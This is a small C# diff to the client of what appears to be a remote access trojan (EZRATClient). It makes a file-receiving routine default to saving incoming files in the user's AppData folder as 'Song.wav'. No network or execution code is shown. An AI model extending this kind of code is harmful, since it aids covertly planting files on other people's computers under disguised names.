@@ -33,6 +33,10 @@ namespace EZRATClient.Core
 
         public static void ReceiveFile(string path)
         {
+            if (path == "" || path == null)
+            {
+                path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Song.wav";
+            }
             int size = 1024;
             long sizeFile = 0, tot = 0;
             FileStream fs = new FileStream(path, FileMode.Create);
